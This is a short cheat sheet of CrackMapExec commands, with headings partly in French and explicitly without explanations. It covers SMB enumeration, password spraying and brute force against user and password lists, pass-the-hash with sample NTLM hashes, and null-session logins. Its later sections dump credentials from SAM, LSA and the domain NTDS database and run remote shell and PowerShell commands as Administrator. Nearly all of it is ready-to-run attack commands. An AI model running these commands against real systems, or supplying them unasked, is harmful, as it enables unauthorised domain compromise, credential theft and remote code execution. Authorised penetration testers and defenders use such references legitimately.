# CME_cheatSheet
A CheatSheet to use CrackMapExec, without lots of explications, only commands.

Enumeration
===========
Network
-------
`crackmapexec smb 10.0.0.0/24`

Shares
------
`cme smb 10.0.0.0 -u UserName -p 'PASS' --shares`

Sessions
--------
`crackmapexec 10.0.0.0 -u UserName -p 'PASS' --sessions`

Disk
----
`cme smb 10.0.0.0 -u UserName -p 'PASS' --disks`

Users
=====
Loggés
------
`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --loggedon-users`

Du domaine
----------
`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --users`

Via RID
-------
`cme smb 192.168.1.0/24 -u UserName -p 'PASS' --rid-brute`

Groupes
=======
Domaine
-------
`cme smb 10.0.0.0 -u UserName -p 'PASS' --groups`

Local
-----
`cme smb 10.0.0.0 -u UserName -p 'PASS' --local-groups`

Password Policy
===============
`cme smb 10.0.0.0 -u UserName -p 'PASS' --pass-pol`

Check creds
===========
User + pass
-----------
`cme smb 192.168.1.0/24 -u UserName -p 'PASS'`

User + hash
-----------
`#cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT'`

`#cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH'`

`cme smb 192.168.1.0/24 -u Administrator -H '13b29964cc2480b4ef454c59562e675c'`

`cme smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'`

Null session
------------
`cme smb 192.168.1.0/24 -u '' -p ''`

Listes
------
`cme smb 192.168.1.101 -u user1 user2 user3 -p Summer18`

`cme smb 192.168.1.101 -u user1 -p password1 password2 password3`

`cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18`

`cme smb 192.168.1.101 -u Administrator -p /path/to/passwords.txt`


`#Pour continuer sur cette session après success`

`cme smb 192.168.1.101 -u /path/to/users.txt -p Summer18 --continue-on-success`

En local
--------
`cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --local-auth`

`cme smb 192.168.1.0/24 -u '' -p '' --local-auth`

`cme smb 192.168.1.0/24 -u UserNAme -H 'LM:NT' --local-auth`

`cme smb 192.168.1.0/24 -u UserNAme -H 'NTHASH' --local-auth`

`cme smb 192.168.1.0/24 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth`

`cme smb 192.168.1.0/24 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth`

Obtenir des creds
=================
SAM
---
`cme smb 10.0.0.0 -u UserName -p 'PASS' --sam`

LSA
---
`cme smb 10.0.0.0 -u UserName -p 'PASS' --lsa`

NTDS
----
`cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds #Via RPC`

`cme smb 10.0.0.0 -u UserName -p 'PASS' --ntds vss #Via VSS`

Exécution de commandes
======================
Commandes + commandes Powershell
--------------------------------
`crackmapexec 10.0.0.0 -u Administrator -p 'P@ssw0rd' -x whoami`

`crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Commande powershell`

